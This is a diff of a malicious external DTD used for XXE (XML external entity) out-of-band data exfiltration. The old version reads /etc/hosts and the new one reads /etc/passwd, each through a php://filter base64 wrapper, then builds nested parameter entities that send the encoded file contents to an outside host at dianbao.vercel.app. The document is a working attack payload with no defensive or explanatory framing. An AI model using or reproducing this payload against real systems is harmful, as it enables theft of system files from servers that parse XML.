@@ -1,4 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
-	<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">
-	<!ENTITY % int "<!ENTITY %#37; trick SYSTEM 'https://dianbao.vercel.app/send/3AD2781AD6E69/%payl'>">
-
+<!ELEMENT check (sid,name,timestamp,root)>
+<!ELEMENT sid (#PCDATA)>
+<!ELEMENT name (#PCDATA)>
+<!ELEMENT timestamp (#PCDATA)>
+<!ELEMENT root (#PCDATA)>
+<!ENTITY % zfile SYSTEM "php://filter/read=convert.base64-
+encode/resource=/etc/passwd">
+<!ENTITY % al "<!ENTITY hello SYSTEM 'http://dianbao.vercel.app/send/3AD2781AD6E69/ESON%zfile;'>">
+%al;
